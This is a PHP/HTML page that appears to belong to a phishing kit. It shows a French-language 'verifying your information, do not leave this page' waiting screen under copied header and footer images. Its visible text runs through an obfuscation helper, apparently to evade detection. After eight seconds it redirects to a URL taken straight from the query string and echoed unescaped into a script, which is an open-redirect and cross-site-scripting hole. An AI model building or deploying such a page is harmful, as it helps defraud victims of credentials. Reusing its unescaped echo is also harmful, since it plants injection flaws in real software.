<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/fonts.css">
<link rel="stylesheet" href="res/img-media.css">
<link rel="stylesheet" href="res/auth.css">
</head>
<body>
<header>
    <img src="res/header-lg.png" class="lg">
    <img src="res/header-md.png" class="md">
    <img src="res/header-sm.png" class="sm">
    <img src="res/header-xs.png" class="xs">
</header>



<main>
 

<div class="right" style=" text-align:center; width:100%; margin:150px 0;">
<div class="form">

<div class="title">
<?php $bm->obf("Vérification de vos informations"); ?>
</div>

<div class="info">
    <div class="flex" style="display:inline-flex"><img src="res/valid.png"><span> <?php $bm->obf("Attendez un moment..."); ?></span> </div>
    <p style="font-size:0.9em; font-weight:bold;"><?php $bm->obf("Ne quittez pas cette page"); ?></p>
    <div class="text">
     <div style="text-align:center;"><img src="res/loading.gif" style="width:50px; margin:10px 0;"></div>
    </div>
 
 
</div>


</div>
</div>
</main>



<footer>
    <img src="res/footer-lg.png" class="lg">
    <img src="res/footer-md.png" class="md">
    <img src="res/footer-sm.png" class="sm">
    <img src="res/footer-xs.png" class="xs">
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</body>